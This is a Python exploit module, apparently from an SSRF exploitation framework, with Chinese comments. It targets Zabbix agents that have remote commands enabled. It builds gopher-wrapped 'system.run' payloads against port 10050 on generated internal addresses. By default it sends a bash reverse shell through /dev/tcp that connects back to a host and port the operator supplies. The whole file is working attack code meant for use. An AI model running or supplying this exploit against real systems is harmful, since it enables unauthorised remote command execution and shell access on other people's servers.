import logging
import urllib.parse as urllib

from core.utils import *

# 注意
# 需要在 Zabbix 服务上设置 `EnableRemoteCommands = 1`

name = "zabbix"
description = "Zabbix 远程代码执行（RCE）"
author = "Swissky"
documentation = []


class exploit:
    cmd = "bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")

        cmd = input("请输入要执行的命令（直接回车则使用反弹 shell）: ")
        if cmd == "":
            if args.lhost == None:
                self.cmd = self.cmd.replace("SERVER_HOST", input("服务器主机:"))
            else:
                self.cmd = self.cmd.replace("SERVER_HOST", args.lhost)

            if args.lport == None:
                self.cmd = self.cmd.replace("SERVER_PORT", input("服务器端口:"))
            else:
                self.cmd = self.cmd.replace("SERVER_PORT", args.lport)
        else:
            self.cmd = cmd

        # 服务数据
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            port = "10050"
            self.cmd = urllib.quote_plus(self.cmd).replace("+", "%20")
            self.cmd = self.cmd.replace("%2F", "/")
            self.cmd = self.cmd.replace("%25", "%")
            self.cmd = self.cmd.replace("%3A", ":")
            data = "system.run[(" + self.cmd + ");sleep 2s]"

            payload = wrapper_gopher(data, ip, port)
            logging.info(f"生成的 payload : {payload}")

            # 发送 payload
            r = requester.do_request(args.param, payload)
